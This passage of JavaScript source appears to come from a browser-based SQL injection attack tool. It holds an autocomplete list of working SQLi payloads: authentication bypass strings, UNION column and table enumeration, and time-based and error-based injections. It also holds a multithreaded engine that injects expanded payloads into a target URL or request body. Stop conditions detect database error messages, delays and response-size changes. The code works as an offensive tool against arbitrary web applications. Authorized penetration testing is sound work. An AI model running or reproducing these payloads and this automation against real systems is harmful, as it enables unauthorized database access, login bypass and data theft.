      const isBatch = payloads.length > 1 && payloads.some(p => p.isBatch);
      return { isBatch, mode: isBatch ? 'brace' : 'single', slots: [], payloads };
    }

    // ===== Autocomplete =====
    const AC_SUGGESTIONS = [
      { t: "ORDER BY {1..10}", h: "column count" },
      { t: "ORDER BY {1..20}-- -", h: "column count" },
      { t: "UNION SELECT {1..5}", h: "union cols" },
      { t: "UNION SELECT {1..10}-- -", h: "union cols" },
      { t: "UNION SELECT NULL{,NULL}", h: "null cols" },
      { t: "' OR '1'='1", h: "auth bypass" },
      { t: "' OR 1=1-- -", h: "auth bypass" },
      { t: "' OR 1=1#", h: "auth bypass" },
      { t: "admin'--", h: "auth bypass" },
      { t: "AND SLEEP(5)-- -", h: "time-based" },
      { t: "AND IF(1=1,SLEEP(5),0)-- -", h: "time-based" },
      { t: "; WAITFOR DELAY '0:0:5'--", h: "MSSQL time" },
      { t: "AND EXTRACTVALUE(1,CONCAT(0x7e,version()))", h: "error-based" },
      { t: "AND UPDATEXML(1,CONCAT(0x7e,database()),1)", h: "error-based" },
      { t: "UNION SELECT 1,2,database()-- -", h: "enum db" },
      { t: "UNION SELECT 1,2,version()-- -", h: "enum ver" },
      { t: "UNION SELECT 1,table_name,3 FROM information_schema.tables-- -", h: "tables" },
      { t: "AND 1=1-- -", h: "boolean true" },
      { t: "AND 1=2-- -", h: "boolean false" },
      { t: "{1..10}", h: "range expand" },
      { t: "{1,2,3,4,5}", h: "list expand" },
      { t: "{a..z}", h: "alpha expand" },
    ];

    const autocompleteBox = $('#autocompleteBox');
    let acIndex = -1;
    let acItems = [];

    function getCurrentWord() {
      const val = payloadInput.value;
      const pos = payloadInput.selectionStart;
      // word from start of current line to cursor
      const lineStart = val.lastIndexOf('\n', pos - 1) + 1;
      const partial = val.slice(lineStart, pos);
      return { partial, lineStart, pos };
    }

    function showAutocomplete() {
      const { partial } = getCurrentWord();
      const q = partial.trim().toUpperCase();
      if (q.length < 1) { autocompleteBox.classList.add('hidden'); return; }
      acItems = AC_SUGGESTIONS.filter(s =>
        s.t.toUpperCase().includes(q) || s.h.toUpperCase().includes(q)
      ).slice(0, 8);
      if (acItems.length === 0) { autocompleteBox.classList.add('hidden'); return; }
      acIndex = 0;
      autocompleteBox.innerHTML = acItems.map((s, i) =>
        `<div class="ac-item ${i === 0 ? 'active' : ''}" data-idx="${i}">
          ${escapeHtml(s.t)}<span class="ac-hint">${escapeHtml(s.h)}</span>
        </div>`
      ).join('');
      autocompleteBox.classList.remove('hidden');
      autocompleteBox.querySelectorAll('.ac-item').forEach(el => {
        el.addEventListener('mousedown', (e) => {
          e.preventDefault();
          applyAutocomplete(+el.dataset.idx);
        });
      });
    }

    function applyAutocomplete(idx) {
      const item = acItems[idx];
      if (!item) return;
      const { lineStart, pos } = getCurrentWord();
      const val = payloadInput.value;
      const lineEnd = val.indexOf('\n', pos);
      const end = lineEnd === -1 ? val.length : lineEnd;
      payloadInput.value = val.slice(0, lineStart) + item.t + val.slice(end);
      const newPos = lineStart + item.t.length;
      payloadInput.setSelectionRange(newPos, newPos);
      payloadInput.focus();
      autocompleteBox.classList.add('hidden');
      refreshAttackPanel();
    }

    payloadInput.addEventListener('input', () => {
      showAutocomplete();
      refreshAttackPanel();
    });
    payloadInput.addEventListener('keydown', (e) => {
      if (autocompleteBox.classList.contains('hidden')) return;
      if (e.key === 'ArrowDown') {
        e.preventDefault();
        acIndex = Math.min(acIndex + 1, acItems.length - 1);
        autocompleteBox.querySelectorAll('.ac-item').forEach((el, i) => el.classList.toggle('active', i === acIndex));
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        acIndex = Math.max(acIndex - 1, 0);
        autocompleteBox.querySelectorAll('.ac-item').forEach((el, i) => el.classList.toggle('active', i === acIndex));
      } else if (e.key === 'Enter' || e.key === 'Tab') {
        if (acIndex >= 0 && acItems[acIndex]) {
          e.preventDefault();
          applyAutocomplete(acIndex);
        }
      } else if (e.key === 'Escape') {
        autocompleteBox.classList.add('hidden');
      }
    });
    payloadInput.addEventListener('blur', () => {
      setTimeout(() => autocompleteBox.classList.add('hidden'), 150);
    });

    // ===== Attack Panel =====
    const attackConfigPanel = $('#attackConfigPanel');
    const attackExpandCount = $('#attackExpandCount');
    const attackPreview = $('#attackPreview');
    // urlProgressBar, pauseBtn, stopBtn, attackProgressLabel — from __sqli bridge

    function syncSendButtonsLabel(isBatch) {
      const label = isBatch ? 'Start SQLi ATK' : 'Send Request';
      [sendBtn, $('#payloadSendBtn')].forEach((btn) => {
        if (!btn) return;
        const textEl = btn.querySelector('.btn-text');
        if (textEl) textEl.textContent = label;
        else btn.textContent = label;
        btn.classList.toggle('attack-mode', !!isBatch);
      });
    }

    function refreshAttackPanel() {
      const mode = detectAttackMode();
      const { isBatch, payloads } = mode;
      const attackBtn = $('#payloadAttackBtn');
      const hint = $('#atkModeHint');
      if (isBatch) {
        if (mode.mode === 'dollar') {
          renderDollarSlotsUI(mode.slots);
          if (hint) hint.textContent = 'Top row = outermost loop. Drag to reorder. Scope = {n..m} / {#..#} / list. Stop = advance only that loop.';
          if (attackExpandCount) {
            const n = estimateDollarCombos(state.attackSlotConfig.order || mode.slots);
            attackExpandCount.textContent = n > 1000000 ? `~${(n / 1e6).toFixed(1)}M` : String(n);
          }
          if (attackPreview) attackPreview.innerHTML = '';
        } else {
          renderDollarSlotsUI([]);
          if (hint) hint.textContent = 'Brace expansion mode — each {…} list becomes a payload.';
          if (attackExpandCount) attackExpandCount.textContent = `${payloads.length} payloads`;
          if (attackPreview) {
            const preview = payloads.slice(0, 12).map(p => `<span>${escapeHtml(p.text.slice(0, 40))}</span>`).join('');
            attackPreview.innerHTML = preview + (payloads.length > 12 ? `<span>+${payloads.length - 12} more</span>` : '');
          }
        }
        if (attackBtn) attackBtn.classList.remove('hidden');
        syncSendButtonsLabel(true);
      } else {
        renderDollarSlotsUI([]);
        if (hint) hint.textContent = 'Use $1, $2… in Payload for nested variable attack, or {1..N} for list expansion.';
        if (attackBtn) attackBtn.classList.add('hidden');
        if (attackConfigPanel && attackConfigPanel.classList.contains('open') && typeof closeVPanel === 'function') {
          closeVPanel('attack-config');
        }
        syncSendButtonsLabel(false);
      }
    }

    function setProgress(done, total) {
      const pct = total ? Math.round((done / total) * 100) : 0;
      if (urlProgressBar) {
        urlProgressBar.style.width = pct + '%';
        urlProgressBar.classList.toggle('active', total > 0 && done < total);
        if (done >= total && total > 0) urlProgressBar.classList.remove('active');
      }
      if (attackProgressLabel) {
        attackProgressLabel.textContent = `${done}/${total} (${pct}%)`;
        attackProgressLabel.classList.toggle('hidden', total === 0);
      }
    }

    function setAttackControls(running) {
      if (pauseBtn) pauseBtn.classList.toggle('hidden', !running);
      if (stopBtn) stopBtn.classList.toggle('hidden', !running);
      document.body.classList.toggle('attack-running', !!running);
      if (!running) {
        urlProgressBar.style.width = '0%';
        urlProgressBar.classList.remove('active');
        attackProgressLabel.classList.add('hidden');
        pauseBtn.textContent = 'Pause';
        state.attack.paused = false;
        state.attack.stop = false;
        state.attack.active = false;
        state._attackLock = false;
        state.isSending = false;
        [sendBtn, $('#payloadSendBtn')].forEach((b) => {
          if (!b) return;
          b.classList.remove('loading');
          b.disabled = false;
        });
      } else {
        urlProgressBar.classList.add('active');
      }
    }

    pauseBtn.addEventListener('click', () => {
      if (!state.attack.active) return;
      state.attack.paused = !state.attack.paused;
      pauseBtn.textContent = state.attack.paused ? 'Resume' : 'Pause';
      urlProgressBar?.classList.toggle('active', !state.attack.paused && !state.attack.stop);
      showToast(state.attack.paused ? 'Attack paused' : 'Attack resumed');
    });
    stopBtn.addEventListener('click', () => {
      if (!state.attack.active) return;
      state.attack.stop = true;
      state.attack.paused = false;
      showToast('Stopping attack…');
    });

    // ===== Send / Attack =====
    function applyPayloadPlaceholders(str, linesOverride) {
      if (!str || !str.includes('$')) return str;
      const lines = linesOverride || (payloadInput.value || '').split('\n');
      return str.replace(/\$(\d+)/g, (match, num) => {
        const idx = parseInt(num, 10) - 1;
        if (idx >= 0 && idx < lines.length) return lines[idx];
        return match;
      });
    }

    function applySinglePayload(str, payloadText) {
      // $1 in URL/body → inject this request's resolved payload text
      // $2+ → other lines from the payload workbench (if any)
      if (!str) return str;
      const text = payloadText == null ? '' : String(payloadText);
      const lines = (payloadInput && payloadInput.value || '').split('\n');
      return String(str).replace(/\$(\d+)/g, (match, num) => {
        const idx = parseInt(num, 10) - 1;
        if (idx === 0) return text;
        if (idx >= 0 && idx < lines.length) {
          const expanded = (typeof expandBraces === 'function') ? expandBraces(lines[idx]) : [lines[idx]];
          return (expanded && expanded[0]) || lines[idx];
        }
        return match;
      });
    }

    // executeOneRequest lives in app.js (shared by Send + Attack)
    function readAttackStopConfig() {
      const parseStatusList = (str) => {
        const out = [];
        String(str || '').split(/[,\s]+/).filter(Boolean).forEach((part) => {
          const m = part.match(/^(\d{1,3})-(\d{1,3})$/);
          if (m) out.push([+m[1], +m[2]]);
          else if (/^\d+$/.test(part)) { const n = +part; out.push([n, n]); }
        });
        return out;
      };
      return {
        action: ($('#atkMatchAction')?.value === 'stop') ? 'stop' : 'pause',
        matchTimes: Math.max(1, Math.min(100, +($('#atkMatchTimes')?.value || 1))),
        cond2xx: !!$('#atkCond2xx')?.checked,
        cond3xx: !!$('#atkCond3xx')?.checked,
        cond4xx: !!$('#atkCond4xx')?.checked,
        cond5xx: !!$('#atkCond5xx')?.checked,
        cond0: !!$('#atkCond0')?.checked,
        condSql: !!$('#atkCondSql')?.checked,
        condStatus: !!$('#atkCondStatus')?.checked,
        statusRanges: parseStatusList($('#atkCondStatusVal')?.value),
        condBody: !!$('#atkCondBody')?.checked,
        bodyRe: ($('#atkCondBodyVal')?.value || '').trim(),
        condUrl: !!$('#atkCondUrl')?.checked,
        urlRe: ($('#atkCondUrlVal')?.value || '').trim(),
        condTime: !!$('#atkCondTime')?.checked,
        timeMs: +($('#atkCondTimeVal')?.value || 0),
        condSize: !!$('#atkCondSize')?.checked,
        sizeOp: ($('#atkCondSizeOp')?.value || 'gt'),
        sizeVal: +($('#atkCondSizeVal')?.value || 0),
        condSizeDiff: !!$('#atkCondSizeDiff')?.checked,
        sizeDiff: +($('#atkCondSizeDiffVal')?.value || 50),
      };
    }

    function attackConditionActive(cfg) {
      return !!(cfg.cond2xx || cfg.cond3xx || cfg.cond4xx || cfg.cond5xx || cfg.cond0 ||
        cfg.condSql || cfg.condStatus || cfg.condBody || cfg.condUrl ||
        cfg.condTime || cfg.condSize || cfg.condSizeDiff);
    }

    function updateAtkStopSummary() {
      const el = $('#atkStopSummary');
      if (!el) return;
      const cfg = readAttackStopConfig();
      if (!attackConditionActive(cfg)) {
        el.textContent = 'No conditions · never auto-pause';
        return;
      }
      const parts = [];
      if (cfg.cond2xx) parts.push('2xx');
      if (cfg.cond3xx) parts.push('3xx');
      if (cfg.cond4xx) parts.push('4xx');
      if (cfg.cond5xx) parts.push('5xx');
      if (cfg.cond0) parts.push('ERR');
      if (cfg.condSql) parts.push('SQLi-err');
      if (cfg.condStatus) parts.push('status');
      if (cfg.condBody) parts.push('body');
      if (cfg.condUrl) parts.push('url');
      if (cfg.condTime) parts.push('time');
      if (cfg.condSize) parts.push('size');
      if (cfg.condSizeDiff) parts.push('Δsize');
      el.textContent = `${cfg.action} after ${cfg.matchTimes}× · ${parts.join('+')}`;
    }

    function shouldStopAttack(entry, cfg, baselineSize) {
      if (!cfg || !attackConditionActive(cfg)) return false;
      const st = entry.response.status || 0;
      const body = entry.response.body || '';
      const timeMs = entry.response.timeMs || 0;
      const checks = [];
      if (cfg.cond2xx) checks.push(st >= 200 && st < 300);
      if (cfg.cond3xx) checks.push(st >= 300 && st < 400);
      if (cfg.cond4xx) checks.push(st >= 400 && st < 500);
      if (cfg.cond5xx) checks.push(st >= 500 && st < 600);
      if (cfg.cond0) checks.push(st === 0);
      if (cfg.condSql) {
        checks.push(/sql syntax|mysql|odbc|ora-\d|postgresql|sqlite|unclosed quotation|sqlstate|you have an error in your sql/i.test(body));
      }
      if (cfg.condStatus) {
        const ranges = cfg.statusRanges || [];
        checks.push(ranges.some(([a, b]) => st >= a && st <= b));
      }
      if (cfg.condBody && cfg.bodyRe) {
        checks.push(matchPattern(body, cfg.bodyRe));
      }
      if (cfg.condUrl && cfg.urlRe) {
        checks.push(matchPattern(entry.url || '', cfg.urlRe));
      }
      if (cfg.condTime) checks.push(timeMs >= (cfg.timeMs || 0));
      if (cfg.condSize) {
        const sz = body.length;
        const n = cfg.sizeVal || 0;
        if (cfg.sizeOp === 'lt') checks.push(sz <= n);
        else if (cfg.sizeOp === 'eq') checks.push(sz === n);
        else checks.push(sz >= n);
      }
      if (cfg.condSizeDiff && baselineSize != null) {
        const sz = body.length;
        checks.push(Math.abs(sz - baselineSize) >= (cfg.sizeDiff || 0));
      }
      // AND across enabled conditions
      return checks.length > 0 && checks.every(Boolean);
    }


    async function runDollarAttack(slots) {
      if (state.attack.active || state._attackLock) {
        showToast('Attack already running');
        return;
      }

      try {
        ensureAttackSlotState(slots);
        const order = (state.attackSlotConfig.order || slots).map((n) => +n);
        // Prefer nested domains; only use edited combo list if user opened Combos
        const useList = Array.isArray(state.attackComboList) && state.attackComboList.length > 0;

        const domains = order.map((n) => ({
          n: +n,
          values: valuesForSlot(+n),
          stop: (state.attackSlotConfig.slots[+n] && state.attackSlotConfig.slots[+n].stop) || null,
        })).filter((d) => d.values.length > 0);

        if (!useList) {
          if (!domains.length) {
            showToast('Configure Scope for each $ (empty domains)');
            return;
          }
        }

        state._attackLock = true;
        state.isSending = true;
        syncSendButtonsSending(true);

        const defaultName = 'VarAttack ' + new Date().toLocaleTimeString();
        let meta;
        try {
          meta = await promptAttackMeta(defaultName);
        } catch (e) {
          console.warn('[dollar-attack] meta dialog error', e);
          meta = { name: defaultName, note: '', cancelled: false };
        }
        if (meta.cancelled) {
          showToast('Attack cancelled');
          return;
        }

        const attackName = meta.name || defaultName;
        const attackNote = meta.note || '';
        const method = methodSelect.value;
        const urlTemplate = (urlInput && urlInput.value || '').trim();
        if (!urlTemplate) {
          showToast('Enter a target URL');
          return;
        }
        let postBodyTemplate = postBodyInput ? postBodyInput.value : '';
        const payloadTemplate = (payloadInput && payloadInput.value || '').trim();
        const customHeaders = buildRequestHeaders(postBodyTemplate);
        const delay = Math.max(0, +($('#atkDelay')?.value || 200));
        const batchId = 'atk-' + Date.now();

        let total = 1;
        if (useList) total = state.attackComboList.length;
        else domains.forEach((d) => { total *= d.values.length; });

        state.attack = {
          active: true, paused: false, stop: false,
          total, done: 0, batchId, name: attackName, note: attackNote,
          matchHits: 0, mode: 'dollar',
        };
        setAttackControls(true);
        document.body.classList.add('attack-running');
        if (!document.body.classList.contains('solo-payload')) {
          const pw = $('#payloadWorkbench');
          if (pw && pw.classList.contains('open') && !pw.classList.contains('pinned')) {
            pw.classList.remove('open');
          }
          if (typeof closeVPanel === 'function') {
            closeVPanel('attack-config');
            closeVPanel('attack-scope');
            closeVPanel('attack-slot-stop');
            closeVPanel('attack-combos');
          }
          if (vpanelBackdrop) vpanelBackdrop.classList.remove('open');
        }
        setProgress(0, total);

        if (!state.attackSources) state.attackSources = {};
        state.attackSources[batchId] = {
          name: attackName,
          note: attackNote,
          urlTemplate,
          payloadText: payloadTemplate,
          method,
          postBody: postBodyTemplate,
          headers: (state.headers || []).map(h => ({ ...h })),
          atkConfig: {
            delay,
            timeout: +($('#atkTimeout')?.value || 15),
            mode: 'dollar',
            order,
            domains: domains.map((d) => ({ n: d.n, count: d.values.length })),
          },
        };
        if (typeof ensureAttackFilterOption === 'function') {
          ensureAttackFilterOption(batchId, attackName);
        }
        state.historyStatusFilter = 'batch:' + batchId;
        if (historyStatusFilter) historyStatusFilter.value = 'batch:' + batchId;

        let baselineSize = null;
        let stoppedEarly = false;
        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

        async function fire(map) {
          while (state.attack.paused && !state.attack.stop) await sleep(80);
          if (state.attack.stop) return { status: 'stop' };
          // 1) Expand attack slots ONLY inside the payload template ($1/$2 in Payload workbench)
          const payloadText = applyDollarMap(payloadTemplate, map);
          // 2) URL / body: $1 means "inject the fully-resolved payload" (never slot values).
          //    Applying applyDollarMap to URL first was the bug — it turned member=$1 into member=1
          //    using the slot map, so the real SQLi payload never left the workbench.
          let url = applySinglePayload(urlTemplate, payloadText);
          let postBody = applySinglePayload(postBodyTemplate, payloadText);
          if (!url) {
            console.warn('[dollar-attack] empty url after inject', map);
            return { status: 'ok' };
          }
          if ((urlTemplate.includes('$') || (postBodyTemplate || '').includes('$')) &&
              url === urlTemplate && !(postBodyTemplate && postBody !== postBodyTemplate)) {
            // still useful when user forgot $1 — log once
            if (!state.attack._warnedNoInject) {
              state.attack._warnedNoInject = true;
              showToast('URL/Body has no $1 — payload not injected into request', 'error');
            }
          }
          let entry;
          try {
            entry = await executeOneRequest(
              url, method, postBody, customHeaders, payloadText, batchId, attackName, null
            );
          } catch (err) {
            console.error('[dollar-attack] request error', err);
            entry = {
              id: state.nextId++,
              method, url, payload: payloadText,
              response: { status: 0, statusText: String(err), timeMs: 0, headers: {}, body: String(err) },
              timestamp: Date.now(),
            };
            state.history.unshift(entry);
          }
          if (attackNote) entry.note = attackNote;
          entry.dollarMap = { ...map };
          state.attack.done++;
          setProgress(state.attack.done, state.attack.total);
          state.activeHistoryId = entry.id;
          const now = Date.now();
          if (!state.attack._lastUi || now - state.attack._lastUi > 350 || state.attack.paused || state.attack.stop) {
            state.attack._lastUi = now;
            try {
              if (typeof displayResponse === 'function') displayResponse(entry.response, entry.url);
              if (typeof renderHistory === 'function') renderHistory();
            } catch (uiErr) {
              console.warn('[dollar-attack] ui update', uiErr);
            }
          }
          if (baselineSize == null && entry.response && entry.response.status > 0) {
            baselineSize = (entry.response.body || '').length;
          }
          let matchLevel = -1;
          for (let li = domains.length - 1; li >= 0; li--) {
            const d = domains[li];
            if (d.stop && shouldStopSlot(entry, d.stop, baselineSize)) {
              matchLevel = li;
              break;
            }
          }
          if (delay > 0 && !state.attack.stop) await sleep(delay);
          if (matchLevel >= 0) return { status: 'match', level: matchLevel };
          return { status: 'ok' };
        }

        async function recurse(level, map) {
          if (state.attack.stop) return { status: 'stop' };
          if (level >= domains.length) {
            return fire({ ...map });
          }
          const d = domains[level];
          for (let i = 0; i < d.values.length; i++) {
            while (state.attack.paused && !state.attack.stop) await sleep(80);
            if (state.attack.stop) return { status: 'stop' };
            map[d.n] = d.values[i];
            const r = await recurse(level + 1, map);
            if (!r) continue;
            if (r.status === 'stop') return r;
            if (r.status === 'match') {
              if (r.level < level) return r;
              if (r.level === level) {
                showToast(`$${d.n} stop → outer advances`, 'success');
                break;
              }
            }
          }
          return { status: 'ok' };
        }

        console.log('[dollar-attack] start', { total, useList, domains: domains.map(d => ({ n: d.n, c: d.values.length })), order });

        if (useList) {
          const queue = state.attackComboList.slice();
          for (let qi = 0; qi < queue.length; qi++) {
            while (state.attack.paused && !state.attack.stop) await sleep(80);
            if (state.attack.stop) break;
            const row = queue[qi];
            const r = await fire({ ...(row.map || {}) });
            if (r.status === 'stop') break;
            if (r.status === 'match' && r.level >= 0 && domains[r.level]) {
              const outerKeys = domains.slice(0, r.level + 1).map((d) => d.n);
              while (qi + 1 < queue.length) {
                const next = queue[qi + 1];
                const same = outerKeys.every((k) => String((next.map || {})[k]) === String((row.map || {})[k]));
                if (!same) break;
                qi++;
              }
            }
          }
        } else {
          await recurse(0, {});
        }

        showToast(
          stoppedEarly || state.attack.stop
            ? `Attack stopped — ${state.attack.done}/${state.attack.total}`
            : `Attack complete — ${state.attack.done}/${state.attack.total}`,
          'success'
        );
      } catch (err) {
        console.error('[dollar-attack] fatal', err);
        showToast('Attack error: ' + (err && err.message ? err.message : String(err)));
      } finally {
        state.isSending = false;
        state._attackLock = false;
        syncSendButtonsSending(false);
        setAttackControls(false);
        try { renderHistory(); } catch (_) {}
        if (typeof setPayloadCollapsed === 'function') setPayloadCollapsed(true);
      }
    }

    async function runAttack(payloads) {



      // Guard against double-start (dialog wait used to leave isSending=false)
      if (state.attack.active || state._attackLock) return;
      state._attackLock = true;
      state.isSending = true;
      [sendBtn, $('#payloadSendBtn')].forEach((b) => {
        if (!b) return;
        b.classList.add('loading');
        b.disabled = true;
      });

      // Custom modal instead of browser prompt
      const defaultName = 'Attack ' + new Date().toLocaleTimeString();
      let meta;
      try {
        meta = await promptAttackMeta(defaultName);
      } catch (e) {
        state._attackLock = false;
        state.isSending = false;
        [sendBtn, $('#payloadSendBtn')].forEach((b) => {
          if (!b) return;
          b.classList.remove('loading');
          b.disabled = false;
        });
        return;
      }
      if (meta.cancelled) {
        state._attackLock = false;
        state.isSending = false;
        [sendBtn, $('#payloadSendBtn')].forEach((b) => {
          if (!b) return;
          b.classList.remove('loading');
          b.disabled = false;
        });
        showToast('Attack cancelled');
        return;
      }
      const attackName = meta.name || defaultName;
      const attackNote = meta.note || '';

      const method = methodSelect.value;
      const urlTemplate = urlInput.value.trim();
      let postBodyTemplate = postBodyInput ? postBodyInput.value : '';
      const customHeaders = buildRequestHeaders(postBodyTemplate);
      const threads = Math.max(1, Math.min(50, +($('#atkThreads')?.value || 3)));
      const delay = Math.max(0, +($('#atkDelay')?.value || 200));
      const stopCfg = readAttackStopConfig();
      const batchId = 'atk-' + Date.now();

      state.attack = {
        active: true, paused: false, stop: false,
        total: payloads.length, done: 0, batchId, payloads, name: attackName, note: attackNote,
        matchHits: 0,
        stopCfg,
      };
      // Do NOT disable entire chrome; pause/stop must stay clickable
      setAttackControls(true);
      document.body.classList.add('attack-running');
      // Keep Payload open in solo; on main close non-pinned payload so dialog/backdrop don't trap UI
      if (!document.body.classList.contains('solo-payload')) {
        const pw = $('#payloadWorkbench');
        if (pw && pw.classList.contains('open') && !pw.classList.contains('pinned')) {
          pw.classList.remove('open');
        }
        if (typeof closeVPanel === 'function') closeVPanel('attack-config');
        if (vpanelBackdrop) vpanelBackdrop.classList.remove('open');
      }
      setProgress(0, payloads.length);

      // Save full attack source so it can be restored later
      state.attackSources[batchId] = {
        name: attackName,
        note: attackNote,
        urlTemplate,
        payloadText: payloadInput.value,
        method,
        postBody: postBodyTemplate,
        headers: state.headers.map(h => ({ ...h })),
        atkConfig: {
          threads,
          delay,
          timeout: +($('#atkTimeout')?.value || 15),
          stopCfg,
        },
      };

      // Register filter option for this attack name
      ensureAttackFilterOption(batchId, attackName);
      state.historyStatusFilter = 'batch:' + batchId;
      if (historyStatusFilter) historyStatusFilter.value = 'batch:' + batchId;

      let baselineSize = null;
      // One queue entry per payload index — workers only shift once (no double-send)
      const queue = payloads.map((p, i) => ({ ...p, attackIndex: i }));
      let stoppedEarly = false;
      const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

      const processOne = async (p) => {
        if (state.attack.stop) return;
        const url = applySinglePayload(urlTemplate, p.text);
        const postBody = applySinglePayload(postBodyTemplate, p.text);
        const entry = await executeOneRequest(
          url, method, postBody, customHeaders, p.text, batchId, attackName, p.attackIndex
        );
        if (attackNote) entry.note = attackNote;
        state.attack.done++;
        setProgress(state.attack.done, state.attack.total);
        state.activeHistoryId = entry.id;

        const now = Date.now();
        if (!state.attack._lastUi || now - state.attack._lastUi > 350 || state.attack.paused || state.attack.stop) {
          state.attack._lastUi = now;
          if (typeof displayResponse === 'function') displayResponse(entry.response, entry.url);
          if (typeof renderHistory === 'function') renderHistory();
        }

        if (baselineSize == null && entry.response.status > 0) {
          baselineSize = (entry.response.body || '').length;
        }
        if (!state.attack.stop && shouldStopAttack(entry, stopCfg, baselineSize)) {
          state.attack.matchHits = (state.attack.matchHits || 0) + 1;
          if (state.attack.matchHits >= (stopCfg.matchTimes || 1)) {
            queue.length = 0;
            if (stopCfg.action === 'stop') {
              state.attack.stop = true;
              stoppedEarly = true;
              urlProgressBar?.classList.remove('active');
              showToast(`Stop condition met (${state.attack.matchHits}×): ${p.text.slice(0, 40)}`);
            } else {
              state.attack.paused = true;
              if (pauseBtn) pauseBtn.textContent = 'Resume';
              urlProgressBar?.classList.remove('active');
              showToast(`Pause condition met (${state.attack.matchHits}×): ${p.text.slice(0, 40)}`);
            }
          }
        }
        if (delay > 0 && !state.attack.stop) await sleep(delay);
      };

      // Worker pool: each worker pulls next item; an item is never processed twice
      const worker = async () => {
        while (!state.attack.stop) {
          while (state.attack.paused && !state.attack.stop) await sleep(80);
          if (state.attack.stop) break;
          const p = queue.shift();
          if (!p) break;
          try {
            await processOne(p);
          } catch (err) {
            console.warn('[attack] worker error', err);
            state.attack.done++;
            setProgress(state.attack.done, state.attack.total);
          }
        }
      };

      const nWorkers = Math.max(1, Math.min(threads, payloads.length));
      await Promise.all(Array.from({ length: nWorkers }, () => worker()));
      if (state.attack.stop) stoppedEarly = true;

      state.isSending = false;
      state._attackLock = false;
      [sendBtn, $('#payloadSendBtn')].forEach((b) => {
        if (!b) return;
        b.classList.remove('loading');
        b.disabled = false;
      });
      setAttackControls(false);
      renderHistory();
      if (typeof setPayloadCollapsed === 'function') setPayloadCollapsed(true);
      showToast(
        stoppedEarly
          ? `Attack stopped — ${state.attack.done}/${state.attack.total}`
          : `Attack complete — ${state.attack.done}/${state.attack.total}`,
        'success'
      );
    }



    // Attack stop conditions overlay
    (function bindAtkStopOverlay() {
      const openBtn = $('#atkStopOpenBtn');
      const ov = $('#atkStopOverlay');
      if (!openBtn || !ov) return;
      const open = () => { ov.classList.add('open'); updateAtkStopSummary(); };
      const close = () => { ov.classList.remove('open'); updateAtkStopSummary(); };
      openBtn.addEventListener('click', (e) => { e.stopPropagation(); open(); });
      $('#atkStopClose')?.addEventListener('click', close);
      $('#atkStopDone')?.addEventListener('click', close);
      $('#atkStopClear')?.addEventListener('click', () => {
        ov.querySelectorAll('input[type=checkbox]').forEach((c) => { c.checked = false; });
        ov.querySelectorAll('input[type=text], input[type=number]').forEach((i) => {
          if (i.id === 'atkCondSizeDiffVal') i.value = '50';
          else i.value = '';
        });
        updateAtkStopSummary();
      });
      ov.querySelectorAll('input, select').forEach((el) => {
        el.addEventListener('change', updateAtkStopSummary);
        el.addEventListener('input', updateAtkStopSummary);
      });
      $('#atkMatchAction')?.addEventListener('change', updateAtkStopSummary);
      $('#atkMatchTimes')?.addEventListener('input', updateAtkStopSummary);
      updateAtkStopSummary();
    })();


    // Public API for app.js / sendRequest
    window.detectAttackMode = detectAttackMode;
    window.refreshAttackPanel = refreshAttackPanel;
    // app.js init may have run before this file; refresh UI now
    try { refreshAttackPanel(); } catch (e) { /* post-init refresh */ }
    window.runAttack = runAttack;
    window.runDollarAttack = runDollarAttack;
    window.applyPayloadPlaceholders = applyPayloadPlaceholders;
    window.applySinglePayload = applySinglePayload;
    window.expandBraces = expandBraces;
    window.expandAllPayloads = expandAllPayloads;
    window.applyDollarMap = applyDollarMap;
    window.detectDollarSlots = detectDollarSlots;
    window.estimateDollarCombos = estimateDollarCombos;
    window.promptAttackMeta = promptAttackMeta;
    window.setAttackControls = setAttackControls;
    window.setProgress = setProgress;
    window.syncSendButtonsLabel = syncSendButtonsLabel;
    window.readAttackStopConfig = readAttackStopConfig;
    window.shouldStopAttack = shouldStopAttack;
    window.updateAtkStopSummary = updateAtkStopSummary;
    window.bindAttackScopeUI = bindAttackScopeUI;
    window.bindAttackCombosUI = bindAttackCombosUI;
    window.bindAttackSlotStopUI = bindAttackSlotStopUI;

    // Wire config UI once
    if (typeof bindAttackScopeUI === 'function') bindAttackScopeUI();
    if (typeof bindAttackCombosUI === 'function') bindAttackCombosUI();
    if (typeof bindAttackSlotStopUI === 'function') bindAttackSlotStopUI();
    // bindAtkStopOverlay already IIFE-invoked above

    if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
    console.info('[attack.js] engine ready');
    return true;
  }

  function tryBoot() {
    if (bootAttack()) return;
    // app.js may still be setting the bridge
    let n = 0;
    const t = setInterval(function () {
      n++;
      if (bootAttack() || n > 50) clearInterval(t);
    }, 20);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', tryBoot);
  } else {
    tryBoot();
  }
  window.__bootAttack = tryBoot;
})();
